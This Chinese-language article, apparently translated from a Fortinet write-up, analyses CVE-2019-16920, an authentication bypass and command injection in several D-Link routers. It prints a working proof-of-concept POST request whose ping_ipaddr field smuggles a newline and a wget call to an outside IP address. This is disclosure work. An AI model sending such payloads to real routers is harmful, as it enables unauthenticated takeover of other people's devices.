**近期研究人员发现Dlink路由器可以绕过认证进行远程代码执行，CVE编号：CVE-2019-16920。**

主要影响路由器版本：

> DIR-655、DIR-866L、DIR-652、DHP-1565

## 漏洞细节

漏洞起因为路由器对认证部分出现了bug，可以从登录页开始进行详细的分析。

    
    
    POST /apply_sec.cgi HTTP/1.1
    Host: 192.168.232.128
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 142
    Connection: close
    Referer: http://192.168.232.128/
    Upgrade-Insecure-Requests: 1
    
    html_response_page=login_pic.asp&login_name=YWRtaW4%3D&log_pass=&action=do_graph_auth&login_n=admin&tmp_log_pass=&
    graph_code=&session_id=62384  
    

通过URI /apply_sec.cgi进行登录验证，搜索代码中的apply_sec.cgi可快速定位其位于/www/cgi/ssi中的do_ssc
(0x40a210)

current_user和user_username从nvram获得：

![1.PNG](https://image.3001.net/images/20191010/1570679495_5d9eaac7c90f7.png!small)

随后程序会将current_user与acStack160中的值进行比较。

current_user的值会在成功登录后赋值，所以在默认状态下并没有进行初始化操作。acStack160 中的值是经过bsase64编码后的用户名，且默认
user_username为‘user'，所以在进行比较时iVar2并不会返回0，程序不会跳转到错误页面。

![2.PNG](https://image.3001.net/images/20191010/1570679502_5d9eaace3da07.png!small)

程序在执行过程中会调用put_querystring_env() 函数来处理HTTP
POST的数据，并将其保存至ENV中，随后会继续调用query_vars(“action”, acStack288, 0x80)。

![3.PNG](https://image.3001.net/images/20191010/1570679507_5d9eaad34faaf.png!small)

最终返回‘action’，如果成功的话，返回值为0。

在返回‘action’为0后，跳入if语句中。程序会对URI和字符串 “/apply_sec.cgi”进行比较，比较相同后会将SSC_SEC_OBJS
赋值给ppcVar3.

![4.PNG](https://image.3001.net/images/20191010/1570679512_5d9eaad862ab3.png!small)

SSC_SEC_OBJS 中存储的是行为列表，如果用户的行为不在列表中则会返回LAB_0040a458（“No OBJS for action:
<action input>”）  

![5.PNG](https://image.3001.net/images/20191010/1570679520_5d9eaae047f1b.png!small)

可以在图2中发现问题所在，程序可以在未认证的状态下继续执行，因此可以执行SSC_SEC_OBJS列表中的行为。

SSC_SEC_OBJS具体初始化及存储内容如下：  

![6.PNG](https://image.3001.net/images/20191010/1570679524_5d9eaae4e1304.png!small)

![7.PNG](https://image.3001.net/images/20191010/1570679529_5d9eaae907f4c.png!small)

其中可以尝试利用行为：ping_test

![8.PNG](https://image.3001.net/images/20191010/1570679534_5d9eaaee27fb2.png!small)

该行为实现函数中首先会从ping_ipaddr中取值，并通过inet_aton()进行转换，最终执行ping。

![9.PNG](https://image.3001.net/images/20191010/1570679537_5d9eaaf1a1938.png!small)

如果尝试输入任何特殊字符，如双引号、引号、分号等，ping将失败。如果我们传递换行符，例如：8.8.8.8%0als，可以执行命令注入。  

    
    
    POST /apply_sec.cgi HTTP/1.1
    Host: 192.168.232.128
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
    Accept-Encoding: gzip, deflate
    Content-Type: application/x-www-form-urlencoded
    Content-Length: 131
    Connection: close
    Referer: http://192.168.232.128/login_pic.asp
    Cookie: uid=1234123
    Upgrade-Insecure-Requests: 1
    html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0awget%20-P%20/tmp/%20http://45.76.148.31:4321/?$(echo 1234)  
    

结果如下

![10.PNG](https://image.3001.net/images/20191010/1570679542_5d9eaaf60c1b3.png!small)

## 总结

该漏洞的根本原因是系统命令执行过程中对执行的任意命令缺乏完整的检查，导致非法字符的注入，使得攻击者可以进行远程命令执行，这是许多固件制造商所面临的典型安全隐患。

 ***参考来源：[fortinet](https://www.fortinet.com/blog/threat-research/d-link-routers-found-vulnerable-rce.html)，由Kriston编译，转载请注明来自FreeBuf.COM **  

